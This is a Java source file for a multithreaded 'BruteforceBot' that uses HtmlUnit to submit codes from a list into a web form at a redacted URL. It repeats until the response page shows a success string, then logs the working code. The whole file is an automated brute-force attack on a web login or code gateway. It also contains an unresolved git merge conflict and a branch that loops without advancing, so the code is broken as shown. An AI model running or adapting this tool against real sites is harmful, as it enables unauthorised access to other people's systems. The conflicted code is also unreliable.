package www.Bruteforce;

import com.gargoylesoftware.htmlunit.FailingHttpStatusCodeException;
import com.gargoylesoftware.htmlunit.WebClient;
import com.gargoylesoftware.htmlunit.html.HtmlForm;
import com.gargoylesoftware.htmlunit.html.HtmlPage;
import com.gargoylesoftware.htmlunit.html.HtmlSubmitInput;
import com.gargoylesoftware.htmlunit.html.HtmlTextInput;
import java.io.IOException;
import static java.lang.System.err;
import static java.lang.System.out;

import java.util.ArrayList;

import org.apache.http.conn.HttpHostConnectException;

public class BruteforceBot extends Thread {

	private WebClient webClient;
	private static final String gatewayURL = "http://www.xxxxx.xx/xxx.php";
	private int start;
	private int finish;
	private ArrayList<String> codes;
	private Logger botLogger;
	private String textFound;

	public BruteforceBot() {
		botLogger = new Logger();
		botLogger.writeTheLogToFile("\n-=Bruteforce Bot Report =-\n");
	}

	public BruteforceBot(int startElement, int finishElement, ArrayList<String> customCodes) {
		this();
		this.codes = customCodes;
		this.start = startElement;
		this.finish = finishElement;
		this.textFound = "";
	}

	private void initDriver() {
		webClient = new WebClient();
	}

	private void destroyDriver() {
		webClient.close();
		botLogger = null;
	}

	@Override
	public void run() {
		brutforce();
	}

	private HtmlPage sendCodeAndGetResponse(int counter)
			throws FailingHttpStatusCodeException, HttpHostConnectException, IOException {
		HtmlPage startPage;
		HtmlForm form;
		HtmlSubmitInput button;
		HtmlTextInput textField;
		HtmlPage responsePage;
		do {
			startPage = webClient.getPage(gatewayURL);
		} while (startPage == null);
		do {
			form = startPage.getFormByName("f1");
		} while (form == null);
		do {
			button = form.getFirstByXPath("/html/body/form/input[2]");
		} while (button == null);
		do {
			textField = form.getInputByName("code");
		} while (textField == null);
		textField.setText(codes.get(counter));
		do {
			responsePage = button.click();
		} while (responsePage == null);
		return responsePage;
	}

	private void getTextFound(int counter) {
		try {
			do {
<<<<<<< HEAD
				textFound = sendCodeAndGetResponse(counter).asText();
=======
				textFound = sendCodeAndGetResponse(counter).asNormalizedText();
>>>>>>> 8eb846d (brute force web bot & tests)
				// we need to be sure that the page is fully loaded
			} while (textFound.contains("Please enter code"));
		} catch (IOException ex) {
			err.println("IOException has been thrown");
			return;
		}
	}

	private void brutforce() {
		initDriver();
		int counter = start;
		while (counter <= finish) {
			getTextFound(counter);
			// Test if the page returns XXX below
			if (textFound.contains("XXX") && !textFound.contains("WOW")) {
				out.println("Not " + codes.get(counter));
				counter++;
				// Test if the page contains "wiki" string below
			} else if (textFound.contains("WOW")) {
				out.println("Correct Code is " + codes.get(counter));
				botLogger.writeTheLogToFile(
						"We have found it: " + textFound + " ... at the code of " + codes.get(counter));
				break;
			} else if (textFound.contains("503 Service Temporarily")) {
				out.println("503 Service Temporarily Unavailable");
				// Test if any other case of response below
			} else {
				out.println("WTF?");
				botLogger.writeTheLogToFile("Strange response for code " + codes.get(counter));
			}
		}
		destroyDriver();
	} // end of bruteforce() method
        
        
    private static final java.util.logging.Logger LOG = java.util.logging.Logger.getLogger(BruteforceBot.class.getName());

}
